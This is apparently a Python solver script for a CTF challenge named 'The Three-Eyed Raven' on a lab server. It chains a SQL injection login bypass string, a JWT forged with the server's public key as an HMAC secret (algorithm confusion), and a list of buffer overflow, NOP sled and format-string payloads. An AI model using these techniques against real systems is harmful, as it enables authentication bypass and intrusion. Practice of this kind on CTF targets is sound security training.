#!/usr/bin/env python3
"""
The Three-Eyed Raven - Dragon Focus
Focus on finding the correct dragon breath buffer overflow payload
"""

import socket
import time
import base64
import json
import hmac
import hashlib
import struct

def connect_to_raven():
    """Connect to The Three-Eyed Raven service"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect(("labs.cyberspacevr.in", 30116))
    time.sleep(0.5)
    s.recv(4096)  # Skip banner
    return s

def setup_iron_and_face(s):
    """Setup iron and face tokens on existing connection"""
    # Get public key
    s.sendall(b"guest\n")
    time.sleep(0.5)
    guest_response = s.recv(4096).decode('utf-8', errors='ignore')
    
    # Extract public key
    start = guest_response.index("-----BEGIN PUBLIC KEY-----")
    end = guest_response.index("-----END PUBLIC KEY-----") + len("-----END PUBLIC KEY-----")
    public_key = guest_response[start:end]
    
    # Create Face JWT
    key = (public_key + '\n').encode()
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"name": "many-faced", "iat": int(time.time())}
    
    h = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    p = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode()
    ).rstrip(b'=')
    
    signing_input = h + b'.' + p
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=')
    
    face_jwt = (signing_input + b'.' + sig_b64).decode()
    
    # Offer iron
    iron_token = "' OR '1'='1"
    s.sendall(f"offer iron {iron_token}\n".encode())
    time.sleep(1)
    s.recv(4096)
    
    # Offer face
    s.sendall(f"offer face {face_jwt}\n".encode())
    time.sleep(1)
    s.recv(4096)
    
    return True

def create_advanced_dragon_payloads():
    """Create advanced buffer overflow payloads for weirwood binary"""
    payloads = []
    
    # 1. Classic buffer overflow patterns
    # Try different buffer sizes to find the exact overflow point
    for size in range(50, 300, 10):
        payloads.append(b"A" * size)
    
    # 2. Pattern-based overflows to identify exact offset
    pattern = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for repeat in range(1, 20):
        payloads.append(pattern * repeat)
    
    # 3. Structured buffer overflow (common 64-bit patterns)
    for buf_size in [64, 72, 80, 88, 96, 104, 112, 120, 128]:
        # Buffer + saved RBP + saved RIP
        payload = b"A" * buf_size + b"BBBBBBBB" + b"CCCCCCCC"
        payloads.append(payload)
    
    # 4. Dragon-themed structured overflows
    dragon_bases = [b"dracarys", b"fire_and_blood", b"Drogon", b"Rhaegal", b"Viserion"]
    for base in dragon_bases:
        for size in [64, 88, 96, 128]:
            payload = base + b"A" * (size - len(base)) + b"BBBBBBBB"
            payloads.append(payload)
    
    # 5. Specific addresses (common for 64-bit)
    addresses = [
        0x4141414141414141,  # AAAAAAAA
        0x4242424242424242,  # BBBBBBBB  
        0x0000000000401000,  # Common code address
        0x0000000000400000,  # Base address
        0x00007fff00000000,  # Stack address range
    ]
    
    for addr in addresses:
        for buf_size in [88, 96, 104]:
            payload = b"A" * buf_size + struct.pack("<Q", addr)
            payloads.append(payload)
    
    # 6. NOP sleds + shellcode patterns
    nop_sleds = [
        b"\x90" * 100,
        b"\x90" * 200,
        b"\x90" * 100 + b"A" * 8,
        b"\x90" * 50 + b"dracarys" + b"\x90" * 50,
    ]
    payloads.extend(nop_sleds)
    
    # 7. Format string + overflow combinations
    format_overflows = [
        b"%p" * 50,
        b"%x" * 50,
        b"%s" * 20,
        b"AAAA" + b"%p" * 30,
    ]
    payloads.extend(format_overflows)
    
    # 8. Specific Game of Thrones payloads
    got_payloads = [
        b"SpaceCTF{fire_and_blood_dracarys_" + b"A" * 100,
        b"THE_WATCH_HOLDS_THE_LINE" + b"A" * 100,
        b"valar_morghulis" + b"A" * 100,
        b"many-faced" + b"A" * 100,
        b"Iron Bank" + b"A" * 100,
        b"Faceless Men" + b"A" * 100,
        b"Three-Eyed Raven" + b"A" * 100,
    ]
    payloads.extend(got_payloads)
    
    return payloads

def test_dragon_payloads_systematically():
    """Test dragon payloads systematically"""
    print("[+] Testing dragon payloads systematically...")
    
    payloads = create_advanced_dragon_payloads()
    print(f"[+] Created {len(payloads)} dragon payloads")
    
    try:
        s = connect_to_raven()
        
        # Setup iron and face
        if not setup_iron_and_face(s):
            print("[-] Failed to setup iron and face")
            s.close()
            return False
        
        print("[+] Iron and face tokens accepted, testing dragon payloads...")
        
        for i, payload in enumerate(payloads):
            if i % 20 == 0:
                print(f"[+] Testing payload {i+1}/{len(payloads)}")
            
            # Encode as base64
            b64_payload = base64.b64encode(payload).decode()
            
            s.sendall(f"offer dragon {b64_payload}\n".encode())
            time.sleep(0.5)
            response = s.recv(4096).decode('utf-8', errors='ignore')
            
            # Check for success
            if "SpaceCTF{" in response:
                print(f"\n🎉 FLAG FOUND: {response}")
                s.close()
                return True
            
            if "accepted" in response.lower():
                print(f"\n[!] Dragon payload {i+1} accepted!")
                print(f"Payload: {payload[:50]}...")
                print(f"Response: {response.strip()}")
                
                # Check status
                s.sendall(b"status\n")
                time.sleep(0.5)
                status = s.recv(4096).decode('utf-8', errors='ignore')
                print(f"Status: {status}")
                
                if "SpaceCTF{" in status:
                    print(f"\n🎉 FLAG FOUND: {status}")
                    s.close()
                    return True
                
                # If all accepted, try to get flag
                if ("iron   : accepted" in status and 
                    "face   : accepted" in status and 
                    "dragon : accepted" in status):
                    
                    print("[!] ALL THREE OFFERINGS ACCEPTED!")
                    
                    # Try different ways to get the flag
                    flag_commands = ["", "help", "quit", "status"]
                    
                    for cmd in flag_commands:
                        s.sendall(f"{cmd}\n".encode())
                        time.sleep(0.5)
                        cmd_response = s.recv(4096).decode('utf-8', errors='ignore')
                        
                        if "SpaceCTF{" in cmd_response:
                            print(f"\n🎉 FLAG FOUND with '{cmd}': {cmd_response}")
                            s.close()
                            return True
                    
                    print("[!] All offerings accepted but flag not found in responses")
                    s.close()
                    return True
            
            elif "turns away" not in response and response.strip():
                print(f"[!] Unusual response for payload {i+1}: {response.strip()}")
        
        s.close()
        
    except Exception as e:
        print(f"Error in systematic test: {e}")
    
    return False

def main():
    print("="*70)
    print("THE THREE-EYED RAVEN - DRAGON FOCUS")
    print("="*70)
    
    if test_dragon_payloads_systematically():
        print("\n🎉 The Three-Eyed Raven challenge completed!")
    else:
        print("\n❌ Dragon breath not found - may need actual Dragonstone Vault completion")

if __name__ == "__main__":
    main()